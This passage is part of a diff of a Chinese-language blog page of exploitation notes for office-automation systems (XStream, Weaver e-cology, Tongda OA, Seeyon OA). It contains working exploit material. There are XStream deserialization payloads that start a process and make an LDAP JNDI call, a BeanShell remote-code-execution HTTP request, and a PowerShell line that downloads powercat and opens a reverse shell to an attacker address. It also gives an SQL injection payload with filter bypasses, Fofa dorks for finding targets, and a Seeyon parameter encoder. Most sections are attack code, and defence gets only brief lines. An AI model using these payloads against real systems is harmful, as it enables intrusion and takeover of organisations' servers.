&lt;null/&gt;\n" +</span><br><span class="line">//                "          &lt;/strMatchColumns&gt;\n" +</span><br><span class="line">//                "        &lt;/default&gt;\n" +</span><br><span class="line">//                "      &lt;/com.sun.rowset.JdbcRowSetImpl&gt;\n" +</span><br><span class="line">//                "    &lt;/com.sun.rowset.JdbcRowSetImpl&gt;\n" +</span><br><span class="line">//                "    &lt;com.sun.rowset.JdbcRowSetImpl reference=\"../com.sun.rowset.JdbcRowSetImpl\"/&gt;\n" +</span><br><span class="line">//                "  &lt;/java.util.PriorityQueue&gt;\n" +</span><br><span class="line">//                "&lt;/java.util.PriorityQueue&gt;";</span><br><span class="line">        xStream.fromXML(payload);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs awk">import com.thoughtworks.xstream.XStream;
+
+import java.io.IOException;
+
+public class Main {
+<span class="hljs-regexp">//</span> POC1
+    public static void main(String[] args) throws IOException {
+            XStream xStream = new XStream();
+            String payload = <span class="hljs-string">"&lt;sorted-set&gt;\n"</span> +
+                    <span class="hljs-string">"    &lt;string&gt;foo&lt;/string&gt;\n"</span> +
+                    <span class="hljs-string">"    &lt;dynamic-proxy&gt;\n"</span> +
+                    <span class="hljs-string">"    &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\n"</span> +
+                    <span class="hljs-string">"        &lt;handler class=\"java.beans.EventHandler\"&gt;\n"</span> +
+                    <span class="hljs-string">"            &lt;target class=\"java.lang.ProcessBuilder\"&gt;\n"</span> +
+                    <span class="hljs-string">"                &lt;command&gt;\n"</span> +
+                    <span class="hljs-string">"                    &lt;string&gt;cmd.exe&lt;/string&gt;\n"</span> +
+                    <span class="hljs-string">"                    &lt;string&gt;/c&lt;/string&gt;\n"</span> +
+                    <span class="hljs-string">"                    &lt;string&gt;calc&lt;/string&gt;\n"</span> +
+                    <span class="hljs-string">"                &lt;/command&gt;\n"</span> +
+                    <span class="hljs-string">"            &lt;/target&gt;\n"</span> +
+                    <span class="hljs-string">"     &lt;action&gt;start&lt;/action&gt;"</span>+
+                    <span class="hljs-string">"        &lt;/handler&gt;\n"</span> +
+                    <span class="hljs-string">"    &lt;/dynamic-proxy&gt;\n"</span> +
+                    <span class="hljs-string">"&lt;/sorted-set&gt;\n"</span>;
+<span class="hljs-regexp">//</span>POC2
+<span class="hljs-regexp">//</span>        String payload = <span class="hljs-string">"&lt;java.util.PriorityQueue serialization=\"custom\"&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"  &lt;unserializable-parents/&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"  &lt;java.util.PriorityQueue&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"    &lt;default&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"      &lt;size&gt;2&lt;/size&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"      &lt;comparator class=\"org.apache.commons.beanutils.BeanComparator\"&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"        &lt;property&gt;databaseMetaData&lt;/property&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"        &lt;comparator class=\"java.util.Collections$ReverseComparator\"/&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"      &lt;/comparator&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"    &lt;/default&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"    &lt;int&gt;3&lt;/int&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"    &lt;com.sun.rowset.JdbcRowSetImpl serialization=\"custom\"&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"      &lt;javax.sql.rowset.BaseRowSet&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"        &lt;default&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;concurrency&gt;1008&lt;/concurrency&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;escapeProcessing&gt;true&lt;/escapeProcessing&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;fetchDir&gt;1000&lt;/fetchDir&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;fetchSize&gt;0&lt;/fetchSize&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;isolation&gt;2&lt;/isolation&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;maxFieldSize&gt;0&lt;/maxFieldSize&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;maxRows&gt;0&lt;/maxRows&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;queryTimeout&gt;0&lt;/queryTimeout&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;readOnly&gt;true&lt;/readOnly&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;rowSetType&gt;1004&lt;/rowSetType&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;showDeleted&gt;false&lt;/showDeleted&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;dataSource&gt;ldap://ip:1389/Object&lt;/dataSource&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;params/&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"        &lt;/default&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"      &lt;/javax.sql.rowset.BaseRowSet&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"      &lt;com.sun.rowset.JdbcRowSetImpl&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"        &lt;default&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;iMatchColumns&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;int&gt;-1&lt;/int&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;int&gt;-1&lt;/int&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;int&gt;-1&lt;/int&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;int&gt;-1&lt;/int&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;int&gt;-1&lt;/int&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;int&gt;-1&lt;/int&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;int&gt;-1&lt;/int&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;int&gt;-1&lt;/int&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;int&gt;-1&lt;/int&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;int&gt;-1&lt;/int&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;/iMatchColumns&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;strMatchColumns&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;string&gt;foo&lt;/string&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;null/&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;null/&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;null/&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;null/&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;null/&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;null/&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;null/&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;null/&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"            &lt;null/&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"          &lt;/strMatchColumns&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"        &lt;/default&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"      &lt;/com.sun.rowset.JdbcRowSetImpl&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"    &lt;/com.sun.rowset.JdbcRowSetImpl&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"    &lt;com.sun.rowset.JdbcRowSetImpl reference=\"../com.sun.rowset.JdbcRowSetImpl\"/&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"  &lt;/java.util.PriorityQueue&gt;\n"</span> +
+<span class="hljs-regexp">//</span>                <span class="hljs-string">"&lt;/java.util.PriorityQueue&gt;"</span>;
+        xStream.fromXML(payload);
+    }
+}</code></pre>
 
 <p><strong>7. 利用技巧</strong></p>
 <p>1.这里 <code>Xstream</code> 同样影响很多使用它的开源组件, 比如<code>Spring</code>系列</p>
@@ -294,10 +446,12 @@
 <p>2019年9月17日泛微OA官方更新了一个远程代码执行漏洞补丁, 泛微e-cology OA系统的Java Beanshell接口可被未授权访问, 攻击者调用该Beanshell接口, 可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行, 漏洞等级严重.</p>
 <p><strong>2. 影响组件</strong><br>泛微OA</p>
 <p><strong>3. 漏洞指纹</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: ecology_JSessionId=</span><br><span class="line">ecology</span><br><span class="line">/weaver/bsh.servlet.BshServlet</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs gams"><span class="hljs-keyword">Set</span>-Cookie: ecology_JSessionId=
+ecology
+/weaver/bsh.servlet.BshServlet</code></pre>
 
 <p><strong>4. Fofa Dork</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app="泛微-协同办公OA"</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"泛微-协同办公OA"</span></code></pre>
 
 <p><strong>5. 漏洞分析</strong></p>
 <p>泛微OA E-cology远程代码执行漏洞原理分析 – FreeBuf互联网安全新媒体平台<br><a href="https://www.freebuf.com/vuls/215218.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/215218.html</a></p>
@@ -305,14 +459,23 @@
 <p><a href="http://beanshell.org/manual/quickstart.html#The_BeanShell_GUI" target="_blank" rel="noopener">http://beanshell.org/manual/quickstart.html#The_BeanShell_GUI</a></p>
 <p><strong>6. 漏洞利用</strong></p>
 <p>Vulnerability-analysis/0917/weaver-oa/CNVD-2019-32204 at master · myzing00/Vulnerability-analysis<br><a href="https://github.com/myzing00/Vulnerability-analysis/tree/master/0917/weaver-oa/CNVD-2019-32204" target="_blank" rel="noopener">https://github.com/myzing00/Vulnerability-analysis/tree/master/0917/weaver-oa/CNVD-2019-32204</a></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /weaver/bsh.servlet.BshServlet HTTP/1.1</span><br><span class="line">Host: xxxxxxxx:8088</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 98</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">bsh.script=eval%00("ex"%2b"ec(\"whoami\")");&amp;bsh.servlet.captureOutErr=true&amp;bsh.servlet.output=raw</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/weaver/bsh.servlet.BshServlet</span> HTTP/1.1
+<span class="hljs-attribute">Host</span>: xxxxxxxx:8088
+<span class="hljs-attribute">Accept</span>: */*
+<span class="hljs-attribute">Accept-Language</span>: en
+<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+<span class="hljs-attribute">Connection</span>: close
+<span class="hljs-attribute">Content-Length</span>: 98
+<span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded
+
+bsh.script=eval%00("ex"%2b"ec(\"whoami\")");&amp;bsh.servlet.captureOutErr=true&amp;bsh.servlet.output=raw</code></pre>
 
 <p><strong>7. 利用技巧</strong></p>
 <p>1.其他形式绕过</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval%00("ex"%2b"ec(\"whoami\")");` 也可以换成 `ex\u0065c("cmd /c dir");</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs lsl">eval%<span class="hljs-number">00</span>(<span class="hljs-string">"ex"</span>%<span class="hljs-number">2</span>b<span class="hljs-string">"ec(<span class="hljs-subst">\"</span>whoami<span class="hljs-subst">\"</span>)"</span>);` 也可以换成 `ex\u0065c(<span class="hljs-string">"cmd /c dir"</span>);</code></pre>
 
 <p>2.泛微多数都是windows环境, 反弹shell可以使用pcat</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX(New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c ip -p 6666 -e cmd</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs reasonml">powershell <span class="hljs-constructor">IEX(New-Object System.Net.Webclient)</span>.<span class="hljs-constructor">DownloadString('<span class="hljs-params">https</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">raw</span>.<span class="hljs-params">githubusercontent</span>.<span class="hljs-params">com</span><span class="hljs-operator">/</span><span class="hljs-params">besimorhino</span><span class="hljs-operator">/</span><span class="hljs-params">powercat</span><span class="hljs-operator">/</span><span class="hljs-params">master</span><span class="hljs-operator">/</span><span class="hljs-params">powercat</span>.<span class="hljs-params">ps1</span>')</span>;powercat -c ip -p <span class="hljs-number">6666</span> -e cmd</code></pre>
 
 <p><strong>8. 防护方法</strong></p>
 <p>1.及时更新泛微补丁</p>
@@ -322,10 +485,13 @@
 <p><strong>2. 影响组件</strong></p>
 <p>泛微OA</p>
 <p><strong>3. 漏洞指纹</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: ecology_JSessionId=</span><br><span class="line">ecology</span><br><span class="line">WorkflowCenterTreeData</span><br><span class="line">/mobile/plugin/SyncUserInfo.jsp</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs gams"><span class="hljs-keyword">Set</span>-Cookie: ecology_JSessionId=
+ecology
+WorkflowCenterTreeData
+/mobile/plugin/SyncUserInfo.jsp</code></pre>
 
 <p><strong>4. Fofa Dork</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app="泛微-协同办公OA"</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"泛微-协同办公OA"</span></code></pre>
 
 <p><strong>5. 漏洞分析</strong></p>
 <p>泛微OA WorkflowCenterTreeData接口注入漏洞(限oracle数据库) – 先知社区<br><a href="https://xz.aliyun.com/t/6531" target="_blank" rel="noopener">https://xz.aliyun.com/t/6531</a></p>
@@ -341,7 +507,7 @@
 <p>4.泛微后端数据库版本存在差异, 但是可以通用检测</p>
 <p>已知泛微OA E8存在2个版本的数据库, 一个是mssql, 一个是oracle, 且新旧版本泛微的sql过滤方法并不一致</p>
 <p>所以这里筛选出一个相对通用的检测手法(下面代码是python的<code>" "*800</code> 800个空格)</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"-1) "+" "*800+ "union select/**/1, Null, Null, Null, Null, Null, Null, Null from Hrmresourcemanager where loginid=('sysadmin'"</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs yaml"><span class="hljs-string">"-1) "</span><span class="hljs-string">+"</span> <span class="hljs-string">"*800+ "</span><span class="hljs-string">union</span> <span class="hljs-string">select/**/1,</span> <span class="hljs-literal">Null</span><span class="hljs-string">,</span> <span class="hljs-literal">Null</span><span class="hljs-string">,</span> <span class="hljs-literal">Null</span><span class="hljs-string">,</span> <span class="hljs-literal">Null</span><span class="hljs-string">,</span> <span class="hljs-literal">Null</span><span class="hljs-string">,</span> <span class="hljs-literal">Null</span><span class="hljs-string">,</span> <span class="hljs-literal">Null</span> <span class="hljs-string">from</span> <span class="hljs-string">Hrmresourcemanager</span> <span class="hljs-string">where</span> <span class="hljs-string">loginid=('sysadmin'"</span></code></pre>
 
 <p>老版本可以在关键字后面加 <code>/**/</code> 来绕过sql检测</p>
 <p>新版本可以通过加入大量空格/换行来绕过sql检测</p>
@@ -357,10 +523,12 @@
 <p><strong>2. 影响组件</strong></p>
 <p>泛微OA</p>
 <p><strong>3. 漏洞指纹</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: ecology_JSessionId=</span><br><span class="line">ecology</span><br><span class="line">/mobile/DBconfigReader.jsp</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs gams"><span class="hljs-keyword">Set</span>-Cookie: ecology_JSessionId=
+ecology
+/mobile/DBconfigReader.jsp</code></pre>
 
 <p><strong>4. Fofa Dork</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app="泛微-协同办公OA"</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"泛微-协同办公OA"</span></code></pre>
 
 <p><strong>5. 漏洞分析</strong></p>
 <p>jas502n/DBconfigReader: 泛微ecology OA系统接口存在数据库配置信息泄露漏洞<br><a href="https://github.com/jas502n/DBconfigReader" target="_blank" rel="noopener">https://github.com/jas502n/DBconfigReader</a></p>
@@ -376,10 +544,12 @@
 <p>通达OA 在国内的用户也比较多, 虽说代码加了密, 奈何是Zend5.4, 解码很简单, 然后代码中的漏洞就很清楚, 尤其是变量覆盖和注入</p>
 <p><strong>2. 影响组件</strong><br>通达OA</p>
 <p><strong>3. 漏洞指纹</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">"/images/tongda.ico"&gt;</span><br><span class="line">Office Anywhere 20xx版 网络智能办公系统</span><br><span class="line">/ispirit/interface/gateway.php</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs groovy"><span class="hljs-string">"/images/tongda.ico"</span>&gt;
+Office Anywhere <span class="hljs-number">20</span>xx版 网络智能办公系统
+<span class="hljs-regexp">/ispirit/</span><span class="hljs-class"><span class="hljs-keyword">interface</span>/<span class="hljs-title">gateway</span>.<span class="hljs-title">php</span></span></code></pre>
 
 <p><strong>4. Fofa Dork</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app="通达OA"</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"通达OA"</span></code></pre>
 
 <p><strong>5. 漏洞分析</strong></p>
 <p>note/readme.md at c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86 · leezp/note<br><a href="https://github.com/leezp/note/blob/c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86/20200313通达OA/readme.md" target="_blank" rel="noopener">https://github.com/leezp/note/blob/c28f7b232ad5f0ff7ccc672bbedcd34e9e3cca86/20200313%E9%80%9A%E8%BE%BEOA/readme.md</a></p>
@@ -392,10 +562,10 @@
 <p>1.这个漏洞也很简单, 发预警的当天就分析出来了, 一个上传, 一个包含, 主要是文件包含漏洞的/ispirit/interface/gateway.php文件在v11才有</p>
 <p>绕过disable_function也很简单, 直接调用<code>COM('WScript.shell')</code>组件就ok了</p>
 <p>2.文件名结构规则如下</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">256@2003_ 2055499620|123. php.</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs angelscript"><span class="hljs-symbol">256@</span><span class="hljs-number">2003</span>_ <span class="hljs-number">2055499620</span>|<span class="hljs-number">123.</span> php.</code></pre>
 
 <p>对应文件名为</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attach/im/2003/2055499620.123.php</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs lsl"><span class="hljs-section">attach</span>/im/<span class="hljs-number">2003</span>/<span class="hljs-number">2055499620.123</span>.php</code></pre>
 
 <p>因为是windows的, <code>1.php.</code> 可以绕过黑名单, 写到文件就成了 <code>1.php</code> (<del>这里是文件包含, 文件名无所谓</del>)</p>
 <p>3.2020年4月20号爆出任意用户伪造登录, 这里小伙伴测试 2017 和 v11 的 poc 好像可以用同一个</p>
@@ -409,10 +579,12 @@
 <p>致远 OA 在国内的用户也比较多, 2019年攻防演练暴出来 htmlofficeservlet getshell 漏洞</p>
 <p><strong>2. 影响组件</strong><br>致远 OA</p>
 <p><strong>3. 漏洞指纹</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/seeyon/htmlofficeservlet</span><br><span class="line">/seeyon/index.jsp</span><br><span class="line">seeyon</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs awk"><span class="hljs-regexp">/seeyon/</span>htmlofficeservlet
+<span class="hljs-regexp">/seeyon/i</span>ndex.jsp
+seeyon</code></pre>
 
 <p><strong>4. Fofa Dork</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app="用友-致远OA"</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"用友-致远OA"</span></code></pre>
 
 <p><strong>5. 漏洞分析</strong></p>
 <p>致远 OA A8 htmlofficeservlet getshell (POC&amp;EXP) – Reber’s Blog<br><a href="http://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/" target="_blank" rel="noopener">http://wyb0.com/posts/2019/seeyon-htmlofficeservlet-getshell/</a></p>
@@ -425,7 +597,64 @@
 <p>1.这个漏洞也挺有意思的, 这个接口是一个金格iweboffice用来处理文件的, 属于一个第三方接口暴露导致的安全问题</p>
 <p>这个漏洞网传的脚本都是一个文件名test123456.jsp, 很容易被人锤啊</p>
 <p>这里贴一个小脚本可以加解密文件名属性之类的, 算法也很简单, 漏洞通告的当天就写出来了, 就是一个换了码表的base64</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">from sys import argv</span><br><span class="line"></span><br><span class="line">letters = "gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6"</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def base64_encode(input_str):</span><br><span class="line">    str_ascii_list = ['{:0&gt;8}'.format(str(bin(ord(i))).replace('0b', ''))</span><br><span class="line">                      for i in input_str]</span><br><span class="line">    output_str = ''</span><br><span class="line">    equal_num = 0</span><br><span class="line">    while str_ascii_list:</span><br><span class="line">        temp_list = str_ascii_list[:3]</span><br><span class="line">        if len(temp_list) != 3:</span><br><span class="line">            while len(temp_list) &lt; 3:</span><br><span class="line">                equal_num += 1</span><br><span class="line">                temp_list += ['0' * 8]</span><br><span class="line">        temp_str = ''.join(temp_list)</span><br><span class="line">        temp_str_list = [temp_str[x:x + 6] for x in [0, 6, 12, 18]]</span><br><span class="line">        temp_str_list = [int(x, 2) for x in temp_str_list]</span><br><span class="line">        if equal_num:</span><br><span class="line">            temp_str_list = temp_str_list[0:4 - equal_num]</span><br><span class="line">        output_str += ''.join([letters[x] for x in temp_str_list])</span><br><span class="line">        str_ascii_list = str_ascii_list[3:]</span><br><span class="line">    output_str = output_str + '=' * equal_num</span><br><span class="line">    return output_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def base64_decode(input_str):</span><br><span class="line">    str_ascii_list = ['{:0&gt;6}'.format(str(bin(letters.index(i))).replace('0b', ''))</span><br><span class="line">                      for i in input_str if i != '=']</span><br><span class="line">    output_str = ''</span><br><span class="line">    equal_num = input_str.count('=')</span><br><span class="line">    while str_ascii_list:</span><br><span class="line">        temp_list = str_ascii_list[:4]</span><br><span class="line">        temp_str = ''.join(temp_list)</span><br><span class="line">        if len(temp_str) % 8 != 0:</span><br><span class="line">            temp_str = temp_str[0:-1 * equal_num * 2]</span><br><span class="line">        temp_str_list = [temp_str[x:x + 8] for x in [0, 8, 16]]</span><br><span class="line">        temp_str_list = [int(x, 2) for x in temp_str_list if x]</span><br><span class="line">        output_str += ''.join([chr(x) for x in temp_str_list])</span><br><span class="line">        str_ascii_list = str_ascii_list[4:]</span><br><span class="line">    return output_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">    if len(argv) == 2:</span><br><span class="line">        print(base64_decode(argv[1]))</span><br><span class="line">    elif len(argv) == 3:</span><br><span class="line">        if argv[1] == '-d':</span><br><span class="line">            print(base64_decode(argv[2]))</span><br><span class="line">        else:</span><br><span class="line">            print(base64_encode(argv[2]))</span><br><span class="line">    else:</span><br><span class="line">        print("Seeyon OA /seeyon/htmlofficeservlet param encode/decode")</span><br><span class="line">        print("Usage:")</span><br><span class="line">        print("python %s encoded_str" % argv[0])t</span><br><span class="line">        print("python %s -d encoded_str" % argv[0])</span><br><span class="line">        print("python %s -e raw_str" % argv[0])</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs vim">from sys import <span class="hljs-built_in">argv</span>
+
+letters = <span class="hljs-string">"gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6"</span>
+
+
+def base64_encode(input_str):
+    str_ascii_list = [<span class="hljs-string">'{:0&gt;8}'</span>.format(str(bin(ord(i))).replace(<span class="hljs-string">'0b'</span>, <span class="hljs-string">''</span>))
+                      <span class="hljs-keyword">for</span> i in input_str]
+    output_str = <span class="hljs-string">''</span>
+    equal_num = <span class="hljs-number">0</span>
+    <span class="hljs-keyword">while</span> str_ascii_lis<span class="hljs-variable">t:</span>
+        temp_list = str_ascii_list[:<span class="hljs-number">3</span>]
+        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(temp_list) != <span class="hljs-number">3</span>:
+            <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(temp_list) &lt; <span class="hljs-number">3</span>:
